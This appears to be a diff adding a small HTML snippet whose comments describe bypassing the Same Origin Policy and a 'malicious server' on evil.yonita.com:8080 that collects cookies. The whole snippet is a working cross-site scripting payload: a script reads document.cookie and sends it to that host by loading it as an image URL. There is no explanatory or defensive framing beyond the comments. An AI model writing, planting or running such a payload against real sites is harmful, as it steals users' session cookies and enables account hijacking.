@@ -1,0 +1,6 @@
+<!-- to bypass Same Origin Policy -->
+<!-- we need to prepare our malicious server which listens on evil.yonita.com:8080 and collect all the cookies! -->
+<script>
+    steal = "http://evil.yonita.com:8080/steal/steal?cookie=" + document.cookie;
+    new Image().src = steal;
+</script>
